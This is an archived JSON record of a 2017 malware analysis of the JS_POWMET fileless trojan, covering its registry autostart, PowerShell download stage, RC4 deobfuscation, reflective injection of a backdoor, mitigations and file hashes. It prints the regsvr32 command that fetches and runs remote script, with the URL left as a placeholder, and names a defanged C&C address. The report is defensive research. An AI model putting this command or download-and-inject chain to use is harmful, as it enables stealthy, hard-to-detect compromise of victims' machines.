{
    "id": "774561fc-0ccd-4266-9a90-17851def8e89",
    "created_at": "2023-01-12T15:02:52.265893Z",
    "updated_at": "2025-03-27T02:05:38.902605Z",
    "deleted_at": null,
    "sha1_hash": "f4b11b0c1d4a823ed02c946db0911996ba57405e",
    "title": "2017-08-02 - A Look at JS_POWMET, a Completely Fileless Malware",
    "authors": "",
    "file_creation_date": "2022-05-29T01:12:33Z",
    "file_modification_date": "2022-05-29T01:12:33Z",
    "file_size": 256579,
    "plain_text": "# A Look at JS_POWMET, a Completely Fileless Malware\n\n**[blog.trendmicro.com/trendlabs-security-intelligence/look-js_powmet-completely-fileless-malware/](http://blog.trendmicro.com/trendlabs-security-intelligence/look-js_powmet-completely-fileless-malware/)**\n\nAugust 2, 2017\n\nMalware\n\nAttacks that use completely fileless malware are a rare occurrence, so we thought it\nimportant to discuss a new trojan known as JS_POWMET that uses a completely fileless\ninfection chain making it more difficult for anti-malware engineers to examine.\n\nBy: Michael Villanueva, Byron Gelera August 02, 2017 Read time: ( words)\n\nAs cybercriminals start to focus on pulling off attacks without leaving a trace, fileless\nmalware, such as [the recent SOREBRECT ransomware, will become a more common attack](http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-fileless-code-injecting-sorebrect-ransomware/)\nmethod. However, many of these malware are fileless only while entering a user’s system, as\nthey eventually reveal themselves when they execute their payload. Attacks that use\ncompletely fileless malware are a rare occurrence, so we thought it important to discuss a\n[new trojan known as JS_POWMET (Detected by Trend Micro as JS_POWMET.DE), which](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/js_powmet.de)\narrives via an autostart registry procedure. By utilizing a completely fileless infection chain,\nthe malware will be more difficult to analyze using a sandbox, making it more difficult for antimalware engineers to examine.\n\n\n-----\n\nGiven that our Smart Protection Network(SPN) data reveals a previously detected backdoor\nwhich is thought to be related to JS_POWMET affecting APAC the most, with almost 90% of\nthe infections coming from the region, the fileless attack can also be considered to be\naffecting the same region.\n\n## Technical Details\n\n[Figure 1](http://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2017/08/powmet1.jpg)\n\nFigure 1. JS_POWMET infection Diagram\n\nAlthough the exact method of arrival is still not certain, it is likely that the trojan is\ndownloaded by users that visit malicious sites, or as a file that is dropped by other malware.\nWhat is clear about this malware is that the following registry has already been changed by\nthe time it is downloaded into the system.\n\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run_ _COM+ =_\n_“regsvr32 /s /n /u /i:{Malicious URL, downloads JS_POWMET} scrobj.dll”_\n\nJS_POWMET is downloaded via an autostart registry entry (shown above). Here are the\ndescriptions for the following parameters used by “regsvr32”:\n\n1. /s = silent option for regsvr32\n2. /n = tells regsvr32 not to use DllRegisterServer\n3. /u = Unregister server/object\n4. /i = used for passing an optional parameter (ie. URL) to DLLinstall\n5. scrobj.dll = Microsoft’s Script Component Runtime\n\nIn this method, a URL was given to regsvr32 as a parameter, which will make regsvr32\ncapable of fetching the file (XML with malicious JavaScript) found on the URL. Due to this\nroutine, regsvr32 will become capable of executing arbitrary scripts without saving the XML\nfile on the machine/system. In particular, whenever the affected machine starts up, it will\nautomatically download the malicious file from its Command & Control (C&C) server.\n\nOnce JS_POWMET is executed, it will then download another file known as\nTROJ_PSINJECT (Detected by Trend Micro as [TROJ_PSINJECT.A). This file is a](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TROJ_PSINJECT.A)\nPowershell script that runs under the process of Powershell. TROJ_PSINJECT will connect\nto the following website:\n\n_hxxps://bogerando[.]ru/favicon_\n\nThis allows TROJ_PSINJECT to download a normal file called favicon. The favicon file will\nthen be decrypted and injected into its process using ReflectivePELoader, which is used for\ninjecting EXE/DLL files.\n\n\n-----\n\nTo deobfuscate the malware code, it uses the following techniques. Initially, the malware\ncontains Base64 Strings that will be decoded and decrypted using the RC4 key (which is\nhard-coded into the malware code). The resulting decrypted strings will be a GZIPcompressed string that is decompressed by the malware itself using the GZIPdecompression routine. This results in the codes for the ReflectivePELoader function that will\nbe used to load the decrypted downloaded file.\n\nFavicon will also be decrypted using the aforementioned RC4 key, resulting in a malicious\n[DLL file known as BKDR_ANDROM (Detected by Trend Micro as BKDR_ANDROM.ETIN).](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/BKDR_ANDROM.ETIN)\nAgain, this part of the process is also fileless; the file will not be saved into the machine but\nrather injected into the powershell.exe process. All of these routines will be executed by the\nmalware using PowerShell commands.\n\n[Figure 2](http://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2017/08/powmet2.jpg)\n\nFigure 2. TROJ_PSINJECT code showing the deobfuscation process\n\nBKDR_ANDROM will terminate powershell.exe if it is found running in the system. In\naddition, it will also gather the following data:\n\nRoot Volume Serial Number\nOperating System Version\nLocal IP Address\nAdministrator privileges\n\nThe malware will add registry entries into the system to ensure that it always executes during\nstartup. The autostart registry entry is capable of decoding the Base64-encoded PowerShell\ncommand, which will be used to decrypt the encrypted binary data (also found on the\nregistry, added by the malware) that will result in the malicious codes of BKDR_ANDROM.\nAfter the decryption process, it will then execute the decrypted malicious codes. While the\nfinal payload in this case consists of common routines of BKDR_ANDROM, there is also a\nchance that future malware authors might make use of other malware as payload.\n\n## Conclusion\n\nWhile JS_POWMET and the rest of the files it downloads are relatively light in terms of\nimpact, this malware demonstrates the lengths cybercriminals will go to avoid detection and\nanalysis. It also shows that even relatively uncommon infection methods involving fileless\nmalware continually evolve. Organizations and users should always look beyond the obvious\nmalware files and always be on the lookout for “stealthy” malware that manages to slip into\nthe system virtually unnoticed. One of the more effective methods for mitigating the effects of\nfileless malware would be to limit access to critical infrastructure via container-based\nsystems that separate endpoints from the most important parts of the network. For this\nspecific malware, IT professionals can also look into disabling Powershell itself to help\nmitigate the effects of JS POWMET and its various payloads\n\n\n-----\n\n**Trend Micro Solutions**\n\nFileless malware is designed to make detection by security solutions more difficult, as such\norganizations need to implement multilayered solutions that can help in detection. Trend\n[Micro endpoint solutions such as Trend Micro™ Security,](http://blog.trendmicro.com/en_us/forHome/products.html) [OfficeScan, and](http://blog.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html) Worry-Free\nBusiness Security include behavior monitoring to detect this type of malware; this can help\norganizations look out for malicious behavior that can block the malware before the behavior\nis executed or performed.\n\nThe following hashes were used for this article:\n\n7004b6c1829a745002feb7fbb0aad1a4d32c640a6c257dc8d0c39ce7b63b58cc\n(TROJ_PSINJECT.A)\ne27f417b96a33d8449f6cf00b8306160e2f1b845ca2c9666081166620651a3ae\n(JS_POWMET.DE)\nbff21cbf95da5f3149c67f2c0f2576a6de44fa9d0cb093259c9a5db919599940\n(BKDR_ANDROM.ETIN)\n\nTags\n\n[Malware |](http://blog.trendmicro.com/en_us/research.html?category=trend-micro-research:threats/malware) [Endpoints |](http://blog.trendmicro.com/en_us/research.html?category=trend-micro-research:environments/endpoints) [Research](http://blog.trendmicro.com/en_us/research.html?category=trend-micro-research:article-type/research)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-08-02 - A Look at JS_POWMET, a Completely Fileless Malware.pdf"
    ],
    "report_names": [
        "2017-08-02 - A Look at JS_POWMET, a Completely Fileless Malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535772,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1653786753,
    "ts_modification_date": 1653786753,
    "files": {
        "pdf": "https://archive.orkl.eu/f4b11b0c1d4a823ed02c946db0911996ba57405e.pdf",
        "text": "https://archive.orkl.eu/f4b11b0c1d4a823ed02c946db0911996ba57405e.txt",
        "img": "https://archive.orkl.eu/f4b11b0c1d4a823ed02c946db0911996ba57405e.jpg"
    }
}